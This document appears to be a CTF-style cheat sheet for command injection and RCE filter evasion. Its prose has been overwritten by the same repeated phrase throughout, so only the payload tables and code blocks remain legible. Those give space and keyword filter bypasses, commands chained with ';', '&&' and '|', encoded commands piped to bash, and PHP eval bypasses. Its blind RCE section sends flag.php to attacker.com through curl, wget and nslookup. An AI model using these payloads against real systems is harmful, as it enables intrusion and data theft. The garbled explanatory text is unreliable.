# remote command execution testing guidance

## remote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | remote command execution testing guidance（remote command execution testing guidance/Tab/remote command execution testing guidance） |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` remote command execution testing guidance shell remote command execution testing guidance 9 remote command execution testing guidance（remote command execution testing guidance），remote command execution testing guidance |
| `${IFS}` + remote command execution testing guidance | `a=$IFS;cat${a}flag` | remote command execution testing guidance |
| `<` | `cat<flag.php` | remote command execution testing guidance |
| `%09` | `cat%09flag.php` | Tab remote command execution testing guidance URL remote command execution testing guidance |
| `%0a` | `cat%0aflag.php` | remote command execution testing guidance |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash remote command execution testing guidance（remote command execution testing guidance Bash） |
| `%0d` | `cat%0dflag.php` | remote command execution testing guidance |

### remote command execution testing guidance
1. **remote command execution testing guidance** `$IFS$9` — remote command execution testing guidance
2. **remote command execution testing guidance** `<` — remote command execution testing guidance，remote command execution testing guidance `<` remote command execution testing guidance
3. **URL remote command execution testing guidance** remote command execution testing guidance `%09` remote command execution testing guidance `%0a`

## remote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|--------|------|------|
| `;` | `id;cat flag` | remote command execution testing guidance |
| `&&` | `id && cat flag` | remote command execution testing guidance |
| `\|\|` | `id \|\| cat flag` | remote command execution testing guidance |
| `\|` | `id \| cat flag` | remote command execution testing guidance |
| `%0a` | `id%0acat flag` | remote command execution testing guidance |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## remote command execution testing guidance/remote command execution testing guidance

### remote command execution testing guidance
```bash
c'a't flag.php       # remote command execution testing guidance
c"a"t flag.php       # remote command execution testing guidance
c\at flag.php        # remote command execution testing guidance
```

### remote command execution testing guidance
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### remote command execution testing guidance
```bash
cat /f   .php        #   remote command execution testing guidance
cat /f*              # * remote command execution testing guidance
/bin/ca  /etc/pas d  # remote command execution testing guidance
cat /f[a-z]ag.php    # remote command execution testing guidance
```

### base64 remote command execution testing guidance
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### hex remote command execution testing guidance
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### remote command execution testing guidance

| remote command execution testing guidance | remote command execution testing guidance | remote command execution testing guidance |
|------|--------|---------|
| remote command execution testing guidance | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| remote command execution testing guidance | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| remote command execution testing guidance | find | ls -la / dir / echo / locate |
| remote command execution testing guidance | wget | curl / nc / python -c 'import urllib...' |
| remote command execution testing guidance | echo > | tee / printf / python -c |

## remote command execution testing guidance（Blind RCE）

remote command execution testing guidance：

### 1. DNS remote command execution testing guidance
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP remote command execution testing guidance
```bash
curl http://attacker.com/ data=$(cat flag.php | base64)
wget http://attacker.com/ data=$(cat flag.php | base64)
```

### 3. remote command execution testing guidance
```bash
cat flag.php > /var/www/html/flag.txt
# remote command execution testing guidance http://target/flag.txt
```

### 4. remote command execution testing guidance/remote command execution testing guidance
```bash
cp flag.php /tmp/flag
# remote command execution testing guidance /tmp/flag
```

### 5. remote command execution testing guidance
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# remote command execution testing guidance
```

## PHP eval remote command execution testing guidance

### remote command execution testing guidance eval remote command execution testing guidance

```php
// remote command execution testing guidance eval($cmd) remote command execution testing guidance $cmd remote command execution testing guidance
system("cat<flag.php");      // remote command execution testing guidance
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + remote command execution testing guidance
```

### remote command execution testing guidance

```php
// remote command execution testing guidance（remote command execution testing guidance strlen > 18）
// remote command execution testing guidance PHP remote command execution testing guidance
 a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### flag remote command execution testing guidance

```php
// remote command execution testing guidance "flag" remote command execution testing guidance
// remote command execution testing guidance
cat /f*          # * remote command execution testing guidance flag
cat /fl g.php    #   remote command execution testing guidance
cat /fla .php
// remote command execution testing guidance
cat /fl''ag.php  # remote command execution testing guidance
cat /fl\ag.php   # remote command execution testing guidance（remote command execution testing guidance）
```
